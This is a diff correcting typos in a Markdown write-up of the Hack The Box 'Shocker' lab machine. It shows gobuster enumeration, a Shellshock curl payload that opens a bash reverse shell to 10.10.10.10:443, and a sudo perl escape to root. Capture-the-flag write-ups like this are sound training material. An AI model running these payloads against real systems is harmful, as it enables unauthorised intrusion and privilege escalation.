@@ -41,7 +41,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed Oct  1 09:05:10 2025 -- 1 IP address (1 host up) scanned in 15.09 seconds
 ```
 
-On port 80 i found a webserver with a simple website only presenting a image file so i checked it for steganography but i did not found anything so i started a directory bruteforce wich gives me a `/cgi-bin/` directory with status code `403`. I started a second directory bruteforce on `/cgi-bin/` and found a `user.sh`.
+On port 80 i found a webserver with a simple website only presenting a image file so i checked it for steganography but i did not found anything so i started a directory bruteforce which gives me a `/cgi-bin/` directory with status code `403`. I started a second directory bruteforce on `/cgi-bin/` and found a `user.sh`.
 
 ```shell
 gobuster dir -u http://shocker.htb/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -o gobuster_scan2 -t 30 -x sh
@@ -81,7 +81,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
 
 ## 💥 Exploitation:
 
-I used `curl` to exploit the shellshock vulnerability, which gives me back a reverse shell as user `shelly`, so i was able to grab the `user.txt` inside the home dirrectory.
+I used `curl` to exploit the shellshock vulnerability, which gives me back a reverse shell as user `shelly`, so i was able to grab the `user.txt` inside the home directory.
 
 ```shell
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1' http://shocker.htb/cgi-bin/user.sh
@@ -91,7 +91,7 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1' h
 
 I have run the `sudo -l` command which gives me following output:
 
-```shell
+```
 sudo -l
 Matching Defaults entries for shelly on Shocker:
     env_reset, mail_badpass,
@@ -101,7 +101,7 @@ User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
 ```
 
-Since shocky is allowed to run `sudo /usr/bin/perl` without providing a password i checked [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo) how to exploit this to gain the `root.txt`.
+Since `shocky` is allowed to run `sudo /usr/bin/perl` without providing a password i checked [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo) how to exploit this to gain the `root.txt`.
 
 ```shell
 sudo perl -e 'exec "/bin/sh";'
